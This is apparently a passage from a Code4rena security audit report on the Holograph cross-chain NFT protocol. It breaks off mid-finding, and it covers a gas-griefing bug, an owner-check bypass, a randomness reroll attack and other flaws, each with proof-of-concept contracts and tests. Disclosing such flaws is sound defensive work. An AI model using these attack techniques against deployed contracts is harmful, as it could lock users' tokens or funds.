There's a check at line 316 that verifies that there's enough gas left to execute the `HolographBridge.bridgeInRequest()` with the `gasLimit` set by the user, however the actual amount of gas left during the call is less than that (mainly due to the `1/64` rule, see below).<br>
An attacker can use that gap to fail the job while still having the `executeJob()` function complete.

### Impact

The owner of the bridged token would loose access to the token since the job failed.

### Proof of Concept

Besides using a few units of gas between the check and the actual call, there's also a rule that only 63/64 of the remaining gas would be dedicated to an (external) function call. Since there are 2 external function calls done (`nonRevertingBridgeCall()` and the actual call to the bridge) `~2/64` of the gas isn't sent to the bridge call and can be used after the bridge call runs out of gas.

The following PoC shows that if the amount of gas left before the call is at least 1 million then the execution can continue after the bridge call fails:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

contract ContractTest is Test {
    event FailedOperatorJob(bytes32 jobHash);
    uint256 private _inboundMessageCounter;
    mapping(bytes32 => bool) private _failedJobs;
    constructor(){
        _inboundMessageCounter = 5;
    }
    function testGas64() public {
        this.entryPoint{gas:1000000}();
    }

    Bridge bridge = new Bridge();
    event GasLeftAfterFail(uint left);

    function entryPoint() public {

        console2.log("Gas left before call: ", gasleft());

        bytes32 hash = 0x987744358512a04274ccfb3d9649da3c116cd6b19c535e633ef8529a80cb06a0;

        try this.intermediate(){
        }catch{
            // check out how much gas is left after the call to the bridge failed
            console2.log("Gas left after failure: ", gasleft());
            // simulate operations done after failure
            _failedJobs[hash] = true;
            emit FailedOperatorJob(hash);
        }
        ++_inboundMessageCounter;
        console2.log("Gas left at end: ", gasleft());

    }

    function intermediate() public{
        bridge.bridgeCall();
    }
}


contract Bridge{
    event Done(uint gasLeft);

    uint256[] myArr;

    function bridgeCall() public {
        for(uint i =1; i <= 100; i++){
            myArr.push(i);
        }
        // this line would never be reached, we'll be out of gas beforehand
        emit Done(gasleft());
    }
}

```

Output of PoC:

      Gas left before call:  999772
      Gas left after failure:  30672
      Gas left at end:  1628

Side note: due to some bug in forge `_inboundMessageCounter` would be considered warm even though it's not necessarily the case. However in a real world scenario we can warm it up if the selected operator is a contract and we'er using another operator contract to execute a job in the same tx beforehand.

Reference for the `1/64` rule - [EIP-150](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-150.md). Also check out [evm.codes](https://www.evm.codes/#f1?fork=grayGlacier:\~:text=From%20the%20Tangerine%20Whistle%20fork%2C%20gas%20is%20capped%20at%20all%20but%20one%2064th%20\(remaining_gas%20/%2064\)%20of%20the%20remaining%20gas%20of%20the%20current%20context.%20If%20a%20call%20tries%20to%20send%20more%2C%20the%20gas%20is%20changed%20to%20match%20the%20maximum%20allowed.).

### Recommended Mitigation Steps

Modify the required amount of gas left to gasLimit + any amount of gas spent before reaching the `call()`, then multiply it by `32/30` to mitigate the `1/64` rule (+ some margin of safety maybe).

**[gzeon (judge) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/176#issuecomment-1294662144):**
 > There are some risks but would require the nested call gas limit to be pretty high (e.g. 1m used in the poc) to have enough gas (`1/64`) left afterward so that it doesn't revert due to out-of-gas.

**[Trust (warden) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/176#issuecomment-1294682078):**
 > @gzeon - actually this is not a limitation. When the call argument passes a gaslimit which is lower than the available gas, it instantly reverts with no gas wasted. Therefore we will have `64/64` of the gas amount to work with post-revert.<br>
> I have explained this in duplicate report [`#437`](https://github.com/code-423n4/2022-10-holograph-findings/issues/437).

**[0xA5DF (warden) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/176#issuecomment-1294770261):**
 > > When the call argument passes a gaslimit which is lower than the available gas, it instantly reverts with no gas wasted.
> 
> You mean *higher* than the available gas?<br>
> I thought the same, but doing some testing and reading the Yellow Paper it turns out it wouldn't revert just because the gas parameter is higher than the available gas.<br>
> You can modify the PoC above to test that too.

**[Trust (warden) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/176#issuecomment-1294786488):**
 > You can check this example in Remix:
> ```
> contract Storage {
>     /**
>      * @dev Return value 
>      * @return value of 'number'
>      */
>     function gas_poc() public  returns (uint256, uint256){
>         uint256 left_gas = gasleft();
>         address this_address = address(this);
>         assembly {
>             let result := call(
>         /// @dev gas limit is retrieved from last 32 bytes of payload in-memory value
>             left_gas,
>             /// @dev destination is bridge contract
>             this_address,
>             /// @dev any value is passed along
>             0,
>             /// @dev data is retrieved from 0 index memory position
>             0,
>             /// @dev everything except for last 32 bytes (gas limit) is sent
>             0,
>             0,
>             0
>             )
>         }
>         uint256 after_left_gas = gasleft();
>         return (left_gas, after_left_gas);
>     }
> 
>     fallback() external {
> 
>     }
> }
> ```
> We pass a lower gas limit than what we have in the "call" opcode, which reverts.<br>
> The function returns 
> ```
> {
> 	"0": "uint256: 3787",
> 	"1": "uint256: 3579"
> }
> ```
> Meaning only the gas consumed by the call opcode was deducted, not 63/64.

**[0xA5DF (warden) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/176#issuecomment-1294800675):**
 > In your example the fallback function is actually being called, it's just doesn't use much gas, I've added an event to confirm that:
> 
> ```solidity
> contract Storage {
>     event Cool();
>     /**
>      * @dev Return value 
>      * @return value of 'number'
>      */
>     function gas_poc() public  returns (uint256, uint256){
>         uint256 left_gas = gasleft();
>         address this_address = address(this);
>         assembly {
>             let result := call(
>         /// @dev gas limit is retrieved from last 32 bytes of payload in-memory value
>             left_gas,
>             /// @dev destination is bridge contract
>             this_address,
>             /// @dev any value is passed along
>             0,
>             /// @dev data is retrieved from 0 index memory position
>             0,
>             /// @dev everything except for last 32 bytes (gas limit) is sent
>             0,
>             0,
>             0
>             )
>         }
>         uint256 after_left_gas = gasleft();
>         return (left_gas, after_left_gas);
>     }
> 
>     fallback() external {
>         emit Cool();
>     }
> }
> ```
> Output:<br>
> ![image](https://user-images.githubusercontent.com/108216601/198561406-53968c73-3196-4f94-ad65-9ce4f2877d28.png)

**[gzeon (judge) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/176#issuecomment-1294817386):**
 > A child call can never use more than 63/64 of gasleft post eip-150.

**[Trust (warden) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/176#issuecomment-1294843497):**
 > @0xA5DF - Yeah , it seems my setup when I tested this during the contest was wrong, because it instantly reverted in the CALL opcode.<br>
> Page 37 of the Yellow book describes the GASCAP as minimum of gasLeft input and current gas counter minus costs:<br>
> ![image](https://user-images.githubusercontent.com/9900020/198568925-2f91aaed-61e2-454d-b8cf-42e9f1ce1477.png)<br>
> Thanks for the good direct counterexample.<br>
> 
> @gzeon - Right, we were discussing if call to child will instantly revert because `requestedGas > availableGas`, but it doesn't.

**[gzeon (judge) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/176#issuecomment-1294849312):**
 > That's true, and the code also doesn't forward a limited amount of gas explicitly too.

**[Trust (warden) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/176#issuecomment-1294854809):**
 > The point was that executor can always craft supplied gas to the contract, so that during the CALL opcode, gas left would be smaller than requested gas limit. If EVM behavior reverts in this check, we have deterministic failing of `bridgeIn`.

**[alexanderattar (Holograph) confirmed and commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/176#issuecomment-1307829065):**
 > Nice find! Gas limit sent by operator could be used maliciously to ensure that job fails. This will be updated to mitigate the issue observed.

**[ACC01ADE (Holograph) resolved](https://github.com/code-423n4/2022-10-holograph-findings/issues/176#event-7817152060):**
 > [Feature/HOLO-604: implementing critical issue fixes](https://github.com/holographxyz/holograph-protocol/pull/84)



***
 
# Medium Risk Findings (19)
## [[M-01] `isOwner` / `onlyOwner` checks can be bypassed by attacker in ERC721/ERC20 implementations](https://github.com/code-423n4/2022-10-holograph-findings/issues/464)
*Submitted by Trust*

[ERC721H.sol#L185](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/abstract/ERC721H.sol#L185)<br>
[ERC721H.sol#L121](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/abstract/ERC721H.sol#L121)<br>

ERC20H and ERC721H are base contracts for NFTs / coins to inherit from. They supply the modifier onlyOwner and function isOwner which are used in the implementations for access control. However, there are several functions which when using these the answer may be corrupted to true by an attacker.

The issue comes from confusion between calls coming from HolographERC721's fallback function, and calls from actually implemented functions.

In the fallback function, the enforcer appends an additional 32 bytes of `msg.sender`:

    assembly {
      calldatacopy(0, 0, calldatasize())
      mstore(calldatasize(), caller())
      let result := call(gas(), sload(_sourceContractSlot), callvalue(), 0, add(calldatasize(), 32), 0, 0)
      returndatacopy(0, 0, returndatasize())
      switch result
      case 0 {
        revert(0, returndatasize())
      }
      default {
        return(0, returndatasize())
      }
    }

Indeed these are the bytes read as msgSender:

    function msgSender() internal pure returns (address sender) {
      assembly {
        sender := calldataload(sub(calldatasize(), 0x20))
      }
    }

and isOwner simply compares these to the stored owner:

    function isOwner() external view returns (bool) {
      if (msg.sender == holographer()) {
        return msgSender() == _getOwner();
      } else {
        return msg.sender == _getOwner();
      }
    }

However, the enforcer calls these functions directly in several locations, and in these cases it of course does not append a 32 byte msg.sender. For example, in safeTransferFrom:

    function safeTransferFrom(
      address from,
      address to,
      uint256 tokenId,
      bytes memory data
    ) public payable {
      require(_isApproved(msg.sender, tokenId), "ERC721: not approved sender");
      if (_isEventRegistered(HolographERC721Event.beforeSafeTransfer)) {
        require(SourceERC721().beforeSafeTransfer(from, to, tokenId, data));
      }
      _transferFrom(from, to, tokenId);
      if (_isContract(to)) {
        require(
          (ERC165(to).supportsInterface(ERC165.supportsInterface.selector) &&
            ERC165(to).supportsInterface(ERC721TokenReceiver.onERC721Received.selector) &&
            ERC721TokenReceiver(to).onERC721Received(address(this), from, tokenId, data) ==
            ERC721TokenReceiver.onERC721Received.selector),
          "ERC721: onERC721Received fail"
        );
      }
      if (_isEventRegistered(HolographERC721Event.afterSafeTransfer)) {
        require(SourceERC721().afterSafeTransfer(from, to, tokenId, data));
      }
    }

Here, caller has arbitrary control of the data parameter, and can pass owner's address.When the implementation, SourceERC721(), gets called, beforeSafeTransfer / afterSafeTransfer will behave as if they are called by owner.

Therefore, depending on the actual implementation, derived contracts can lose funds by specifying owner-specific logic.

This pattern occurs with the following functions, which have an arbitrary data parameter:

*   beforeSafeTransfer / after SafeTransfer
*   beforeTransfer / afterTransfer
*   beforeOnERC721Received / afterOnERC721Received
*   beforeOnERC20Received / aferERC20Received

### Impact

Owner-specific functionality can be initiated on NFT / ERC20 implementation contracts.

### Recommended Mitigation Steps

Refactor the code to represent `msg.sender` information in a bug-free way.

**[gzeon (judge) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/464#issuecomment-1295213520):**
 > Those function do not have the `onlyOwner` modifier so this doesn't seems to be valid. e.g.
> [StrictERC20H.sol#L220-L228](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/abstract/StrictERC20H.sol#L220-L228)

**[Trust (warden) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/464#issuecomment-1295249488):**
 > isOwner and onlyOwner are utilities implemented in ERC721H, to be used in implementation contracts. The actual implementations are out of scope, and defined by NFT / ERC20 creators. We can see such an example in the SampleERC721.sol file, which indeed uses onlyOwner:
> ```
>   function mint(
>     address to,
>     uint224 tokenId,
>     string calldata URI
>   ) external onlyHolographer onlyOwner {
>     HolographERC721Interface H721 = HolographERC721Interface(holographer());
>     if (tokenId == 0) {
>       _currentTokenId += 1;
>       while (H721.exists(uint256(_currentTokenId)) || H721.burned(uint256(_currentTokenId))) {
>         _currentTokenId += 1;
>       }
>       tokenId = _currentTokenId;
>     }
>     H721.sourceMint(to, tokenId);
>     uint256 id = H721.sourceGetChainPrepend() + uint256(tokenId);
>     _tokenURIs[id] = URI;
>   }
> ```
> The submission proves that these modifiers, which ARE in scope, are NOT safe to use in certain function implementations, as they can be bypassed. Since there is no warning label to not use those utilities in the list of functions I mentioned, this could potentially result in real damage to the protocol.

**[gzeon (judge) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/464#issuecomment-1295834895):**
 > Is there a codepath that the Holographer will call mint without appending sender address? This might be easy to misuse (which I doubt) but would be QA at best. Imo the modifier is working as intended and it is the developers responsibility to understand the consequences of making a call from the Holographer (which is a privileged account) regardless. Everything can be misused does not mean they are Med/High risk unless you can provide an actual exploit.

**[Trust (warden) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/464#issuecomment-1295842157):**
 > I have brought up mint() as an example of using onlyOwner in the ERC721 implementation. I will reiterate that the issue is confusion between calls coming from HolographERC721's fallback function, and calls from Enforcer's transferFrom / safeTransferFrom / etc. When the list of functions above (beforeTransferFrom/ afterTransferFrom / etc) are called NOT from the fallback, which happens in transferFrom / safeTransferFrom / onERC20Received, the sender can pass any "data" parameter they wish, which will be interpreted by the isOwner function as the passed sender in the last 32 bytes.
> 
> "Everything can be misused does not mean they are Med/High risk unless you can provide an actual exploit." - The problem is that it will NOT be developer misuse to use isOwner / onlyOwner in ERC721/ERC20 implementation, it's use of inherited functionality (like in SampleERC721.sol example). There is no warning that owner check is not safe from "beforeOnERC20Received", for example.  Protocol is likely shooting themselves in the foot if they don't protect from owner checks in these functions.
> 
> If it is required I have no problem coding example innocent ERC20/ERC721 implementation that is vulnerable to the attack.

**[gzeon (judge) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/464#issuecomment-1296062620):**
 > I will reopen this to let sponsor comment, but intended to judge as QA. Will review when judging.

Also they can't manipulate unless it is called from the Holographer, which have limited affordance.

**[alexanderattar (Holograph) confirmed and commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/464#issuecomment-1306627521):**
 > This is a valid find. We will revisit the isOwner / onlyOwner modifiers and ensure this is handled appropriately so developers inheriting the mentioned Holograph contracts don't accidentally introduce unexpected logic in their contracts

**[ACC01ADE (Holograph) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/464#issuecomment-1320038876):**
 > Fixing this by ensuring that any calls to implementation contracts from HolographERC20 and HolographERC721 do not call directly, but first have the caller attached to end of calldata so that isOwner and onlyOwner are consistent.
>
> [Feature/HOLO-605: C4 medium risk fixes](https://github.com/holographxyz/holograph-protocol/pull/88)



***

## [[M-02] `_payoutToken[s]()` is not compatible with tokens with missing return value](https://github.com/code-423n4/2022-10-holograph-findings/issues/456)
*Submitted by d3e4, also found by \_\_141345\_\_, 2997ms, ballx, Bnke0x0, brgltd, brgltd, cccz, cccz, chaduke, d3e4, Dinesh11G, Jeiwan, joestakey, Lambda, martin, pashov, RedOneN, Trust, V\_B, and vv7*

[PA1D.sol#L317](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/src/enforcer/PA1D.sol#L317)<br>
[PA1D.sol#L340](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/src/enforcer/PA1D.sol#L340)<br>

Payout is blocked and tokens are stuck in contract.

### Proof of Concept

`PA1D._payoutToken()` and `PA1D._payoutTokens()` call `ERC20.transfer()` in a require-statement to send tokens to a list of payout recipients.<br>
Some tokens do not return a bool (e.g. USDT, BNB, OMG) on ERC20 methods. But since the require-statement expects a `bool`, for such a token a `void` return will also cause a revert, despite an otherwise successful transfer. That is, the token payout will always revert for such tokens.

### Recommended Mitigation Steps

Use [OpenZeppelin's SafeERC20](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol), which handles the return value check as well as non-standard-compliant tokens.

**[alexanderattar (Holograph) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/456#issuecomment-1306632476):**
 > Low priority, but can be updated to ensure compatibility with all ERC20 tokens.

**[alexanderattar (Holograph) linked a PR](https://github.com/code-423n4/2022-10-holograph-findings/issues/456#issuecomment-1306632476):**
 > [Feature/holo 612 royalty smart contract improvements](https://github.com/holographxyz/holograph-protocol/pull/93)



***

## [[M-03] Beaming job might freeze on dest chain under some conditions, leading to owner losing (temporarily) access to token](https://github.com/code-423n4/2022-10-holograph-findings/issues/170)
*Submitted by 0xA5DF*

[HolographOperator.sol#L255](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/src/HolographOperator.sol#L255)<br>

If the following conditions have been met:

*   The selected operator doesn't complete the job, either intentionally (they're sacrificing their bonded amount to harm the token owner) or innocently (hardware failure that caused a loss of access to the wallet)
*   Gas price has spiked, and isn't going down than the `gasPrice` set by the user in the bridge out request

Then the bridging request wouldn't complete and the token owner would loos access to the token till the gas price goes back down again.

### Proof of Concept

The fact that no one but the selected operator can execute the job in case of a gas spike has been proven by the test ['Should fail if there has been a gas spike'](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/test/14\_holograph_operator_tests.ts#L834-L844) provided by the sponsor.

An example of a price spike can be in the recent month in the Ethereum Mainnet where the min gas price was 3 at Oct 8, but jumped to 14 the day after and didn't go down since then (the min on Oct 9 was lower than the avg of Oct8, but users might witness a momentarily low gas price and try to hope on it). See the [gas price chat on Etherscan](https://etherscan.io/chart/gasprice) for more details.

### Recommended Mitigation Steps

In case of a gas price spike, instead of refusing to let other operators to execute the job, let them execute the job without slashing the selected operator. This way, after a while also the owner can execute the job and pay the gas price.

**[Trust (warden) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/170#issuecomment-1296344314):**
 > If there is a gas spike, it is too expensive to execute the transaction, so we should not force executor to do it. I think it is intended behavior that TX just doesnt execute until gas falls back down.<br>
> The docs state there is a refund mechanism that is activated in this case, back to origin chain.

**[0xA5DF (warden) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/170#issuecomment-1296346189):**
 > > The docs state there is a refund mechanism that is activated in this case, back to origin chain.
> 
> Can you please point where in the docs does it state that?<br>
> Also, regardless of the docs, that kind of mechanism is certainly not implemented.

**[Trust (warden) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/170#issuecomment-1296349735):**
 > https://docs.holograph.xyz/holograph-protocol/operator-network-specification<br>
> Operator Job Selection:<br>
> "Operator jobs are given specific gas limits. This is meant to prevent gas spike abuse (e.g., as a form of DoS attack), bad code, or smart contract reverts from penalizing good-faith operators. If an operator is late to finalize a job and another operator steps in to take its place, if the gas price is above the set limit, the selected operator will not get slashed. A job is considered successful if it does not revert, or if it reverts but gas limits were followed correctly. Failed jobs can be re-done (for an additional fee), can be returned to origin chain (for an additional fee), or left untouched entirely. This shifts the financial responsibility towards users, rather than operators."

**[0xA5DF (warden) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/170#issuecomment-1296351047):**
 > Thanks, wasn't aware of that at time of submission.<br>
> But the docs specifically talk about 'failed jobs', in this case the job wouldn't even be marked as failed since nobody would be able to execute the `executeJob()` function (the `require(gasPrice >= tx.gasprice` would revert the entire function rather than move to the catch block)

**[Trust (warden) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/170#issuecomment-1296351620):**
 > I think the assumption is that tx.gasprice will eventually come back to a non-reverting amount. Agree that it seems like a good idea to add a force-fail after EXPIRY_NUM blocks passed, without executing the TX.

**[alexanderattar (Holograph) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/170#issuecomment-1307835385):**
 > Agree that it seems like a good idea to add a force-fail after EXPIRY_NUM blocks passed, without executing the TX.



***

## [[M-04] Incorrect implementation of ERC721 may have bad consequences for receiver](https://github.com/code-423n4/2022-10-holograph-findings/issues/469)
*Submitted by Trust, also found by adriro*

[HolographERC721.sol#L467](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC721.sol#L467)<br>

HolographERC721.sol is an enforcer contract that fully implements ERC721. In its safeTransferFromFunction there is the following code:

    if (_isContract(to)) {
      require(
        (ERC165(to).supportsInterface(ERC165.supportsInterface.selector) &&
          ERC165(to).supportsInterface(ERC721TokenReceiver.onERC721Received.selector) &&
          ERC721TokenReceiver(to).onERC721Received(address(this), from, tokenId, data) ==
          ERC721TokenReceiver.onERC721Received.selector),
        "ERC721: onERC721Received fail"
      );
    }

If the target address is a contract, the enforcer requires the target's `onERC721Received()` to succeed. However, the call deviates from the [standard](https://eips.ethereum.org/EIPS/eip-721):

    interface ERC721TokenReceiver {
        /// @notice Handle the receipt of an NFT
        /// @dev The ERC721 smart contract calls this function on the recipient
        ///  after a `transfer`. This function MAY throw to revert and reject the
        ///  transfer. Return of other than the magic value MUST result in the
        ///  transaction being reverted.
        ///  Note: the contract address is always the message sender.
        /// @param _operator The address which called `safeTransferFrom` function
        /// @param _from The address which previously owned the token
        /// @param _tokenId The NFT identifier which is being transferred
        /// @param _data Additional data with no specified format
        /// @return `bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"))`
        ///  unless throwing
        function onERC721Received(address _operator, address _from, uint256 _tokenId, bytes _data) external returns(bytes4);
    }

The standard mandates that the first parameter will be the operator - the caller of safeTransferFrom. The enforcer passes instead the `address(this)` value, in other words the Holographer address. The impact is that any bookkeeping done in target contract, and allow / disallow decision of the transaction, is based on false information.

### Impact

ERC721 transferFrom's "to" contract may fail to accept transfers, or record credit of transfers incorrectly.

### Recommended Mitigation Steps

Pass the msg.sender parameter, as the ERC721 standard requires.

**[alexanderattar (Holograph) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/469#issuecomment-1306626633):**
 > This will be updated to pass msg.sender instead of Holograph address to match the standard.

**[ACC01ADE (Holograph) linked a PR](https://github.com/code-423n4/2022-10-holograph-findings/issues/469#ref-pullrequest-1452472274):**
 > [Feature/HOLO-605: C4 medium risk fixes](https://github.com/holographxyz/holograph-protocol/pull/88)



***

## [[M-05] It is possible that operator loses sent ETH after calling `HolographOperator` contract's `executeJob` function](https://github.com/code-423n4/2022-10-holograph-findings/issues/418)
*Submitted by rbserver*

ETH can be sent when calling the `HolographOperator` contract's `executeJob` function, which can execute the following code.

```solidity
File: contracts\HolographOperator.sol
419:     try
420:       HolographOperatorInterface(address(this)).nonRevertingBridgeCall{value: msg.value}(
421:         msg.sender,
422:         bridgeInRequestPayload
423:       )
424:     {
425:       /// @dev do nothing
426:     } catch {
427:       _failedJobs[hash] = true;
428:       emit FailedOperatorJob(hash);
429:     }
```

Executing the `try ... {...} catch {...}` code mentioned above will execute `HolographOperatorInterface(address(this)).nonRevertingBridgeCall{value: msg.value}(...)`. Calling the `nonRevertingBridgeCall` function can possibly execute `revert(0, 0)` if the external call to the bridge contract is not successful. When this occurs, the code in the `catch` block of the `try ... {...} catch {...}` code mentioned above will run, which does not make calling the `executeJob` function revert. As a result, even though the job is not successfully executed, the sent ETH is locked in the `HolographOperator` contract since there is no other way to transfer such sent ETH out from this contract. In this situation, the operator that calls the `executeJob` function will lose the sent ETH.

<https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L301-L439>

```solidity
  function executeJob(bytes calldata bridgeInRequestPayload) external payable {
    
    ...

    /**
     * @dev execute the job
     */
    try
      HolographOperatorInterface(address(this)).nonRevertingBridgeCall{value: msg.value}(
        msg.sender,
        bridgeInRequestPayload
      )
    {
      /// @dev do nothing
    } catch {
      _failedJobs[hash] = true;
      emit FailedOperatorJob(hash);
    }
    /**
     * @dev every executed job (even if failed) increments total message counter by one
     */
    ++_inboundMessageCounter;
    /**
     * @dev reward operator (with HLG) for executing the job
     * @dev this is out of scope and is purposefully omitted from code
     */
    ////  _bondedOperators[msg.sender] += reward;
  }
```

<https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L445-L478>

```solidity
  function nonRevertingBridgeCall(address msgSender, bytes calldata payload) external payable {
    require(msg.sender == address(this), "HOLOGRAPH: operator only call");
    assembly {
      /**
       * @dev remove gas price from end
       */
      calldatacopy(0, payload.offset, sub(payload.length, 0x20))
      /**
       * @dev hToken recipient is injected right before making the call
       */
      mstore(0x84, msgSender)
      /**
       * @dev make non-reverting call
       */
      let result := call(
        /// @dev gas limit is retrieved from last 32 bytes of payload in-memory value
        mload(sub(payload.length, 0x40)),
        /// @dev destination is bridge contract
        sload(_bridgeSlot),
        /// @dev any value is passed along
        callvalue(),
        /// @dev data is retrieved from 0 index memory position
        0,
        /// @dev everything except for last 32 bytes (gas limit) is sent
        sub(payload.length, 0x40),
        0,
        0
      )
      if eq(result, 0) {
        revert(0, 0)
      }
      return(0, 0)
    }
  }
```

### Proof of Concept

First, please add the following `OperatorAndBridgeMocks.sol` file in `src\mock\`.

```solidity
pragma solidity 0.8.13;

// OperatorMock contract simulates the logic flows used in HolographOperator contract's executeJob and nonRevertingBridgeCall functions
contract OperatorMock {
    bool public isJobExecuted = true;

    BridgeMock bridgeMock = new BridgeMock();

    // testExecuteJob function here simulates the logic flow used in HolographOperator.executeJob function
    function testExecuteJob() external payable {
        try IOperatorMock(address(this)).testBridgeCall{value: msg.value}() {
        } catch {
            isJobExecuted = false;
        }
    }
    
    // testBridgeCall function here simulates the logic flow used in HolographOperator.nonRevertingBridgeCall function
    function testBridgeCall() external payable {
        // as a simulation, the external call that sends ETH to bridgeMock contract will revert
        (bool success, ) = address(bridgeMock).call{value: msg.value}("");
        if (!success) {
            assembly {
                revert(0, 0)
            }
        }
        assembly {
            return(0, 0)
        }
    }
}

interface IOperatorMock {
    function testBridgeCall() external payable;
}

contract BridgeMock {
    receive() external payable {
        revert();
    }
}
```

Then, please add the following `POC.ts` file in `test\`.

```typescript
import { expect } from "chai";
import { ethers } from "hardhat";

describe('POC', () => {
    it("It is possible that operator loses sent ETH after calling HolographOperator contract's executeJob function", async () => {
        // deploy operatorMock contract that simulates
        //   the logic flows used in HolographOperator contract's executeJob and nonRevertingBridgeCall functions
        const OperatorMockFactory = await ethers.getContractFactory('OperatorMock');
        const operatorMock = await OperatorMockFactory.deploy();
        await operatorMock.deployed();

        await operatorMock.testExecuteJob({value: 500});

        // even though the job is not successfully executed, the sent ETH is locked in operatorMock contract
        const isJobExecuted = await operatorMock.isJobExecuted();
        expect(isJobExecuted).to.be.eq(false);
        expect(await ethers.provider.getBalance(operatorMock.address)).to.be.eq(500);
    });
});
```

Last, please run `npx hardhat test test/POC.ts --network hardhat`. The `It is possible that operator loses sent ETH after calling HolographOperator contract's executeJob function` test will pass to demonstrate the described scenario.

### Tools Used

VSCode

### Recommended Mitigation Steps

In the `catch` block of the `try ... {...} catch {...}` code mentioned above in the Impact section, the code can be updated to transfer the `msg.value` amount of ETH back to the operator, which is `msg.sender` for the `HolographOperator` contract's `executeJob` function, when this described situation occurs.

**[ACC01ADE (Holograph) confirmed and commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/418#issuecomment-1308898962):**
 > Good catch, good POC.

**[gzeon (judge) decreased severity to Medium](https://github.com/code-423n4/2022-10-holograph-findings/issues/418)**



***

## [[M-06] Bad source of randomness](https://github.com/code-423n4/2022-10-holograph-findings/issues/427)
*Submitted by minhtrng, also found by \_\_141345\_\_, adriro, cdahlheimer, d3e4, Deivitto, ladboy233, nadin, teawaterwire, and V\_B*

[HolographOperator.sol#L491-L511](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L491-L511)<br>

Using `block.number` and `block.timestamp` as a source of randomness is commonly advised against, as the outcome can be manipulated by calling contracts. In this case a compromised layer-zero-endpoint would be able to retry the selection of the primary operator until the result is favorable to the malicious actor.

### Proof of Concept

An attack path for rerolling the result of bad randomness might look roughly like this:

```js
function attack(uint256 currentNonce, uint256 wantedPodIndex, uint256 numPods, uint256 wantedOperatorIndex, uint256 numOperators,  bytes calldata bridgeInRequestPayload) external{

    bytes32 jobHash = keccak256(bridgeInRequestPayload);

    //same calculation as in HolographOperator.crossChainMessage
    uint256 random = uint256(keccak256(abi.encodePacked(jobHash, currentNonce, block.number, block.timestamp)));

    require(wantedPodIndex == random % numPods)
    require(wantedOperatorIndex == random % numOperators);

    operator.crossChainMessage(bridgeInRequestPayload);
}
```

The attack basically consists of repeatedly calling the `attack` function with data that is known and output that is wished for until the results match and only then continuing to calling the operator.

### Recommended Mitigation Steps

Consider using a decentralized oracle for the generation of random numbers, such as [Chainlinks VRF](https://docs.chain.link/docs/vrf/v2/introduction/).

It should be noted, that in this case there is a prerequirement of the layer-zero endpoint being compromised, which confines the risk quite a bit, so using a normally unrecommended source of randomness could be acceptable here, considering the tradeoffs of integrating a decentralized oracle.

**[ACC01ADE (Holograph) confirmed and commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/427#issuecomment-1308894416):**
 > Very valid issue.

**[gzeon (judge) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/427#issuecomment-1320939907):**
 > While sponsor noted this is a design choice to use pseudorandomness, as pointed out by the warden a compromised layer-zero-endpoint can exploit this for profit, judging this as Medium risk.



***

## [[M-07]  Attacker can force chaotic operator behavior](https://github.com/code-423n4/2022-10-holograph-findings/issues/432)
*Submitted by Trust, also found by csanuragjain*

[HolographOperator.sol#L875](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L875)<br>

Operators are organized into different pod tiers. Every time a new request arrives, it is scheduled to a random available pod. It is important to note that pods may be empty, in which case the pod array actually has a single zero element to help with all sorts of bugs. When a pod of a non existing tier is created, any intermediate tiers between the current highest tier to the new tier are filled with zero elements. This happens at bondUtilityToken():

    if (_operatorPods.length < pod) {
      /**
       * @dev activate pod(s) up until the selected pod
       */
      for (uint256 i = _operatorPods.length; i <= pod; i++) {
        /**
         * @dev add zero address into pod to mitigate empty pod issues
         */
        _operatorPods.push([address(0)]);
      }
    }

The issue is that any user can spam the contract with a large amount of empty operator pods. The attack would look like this:

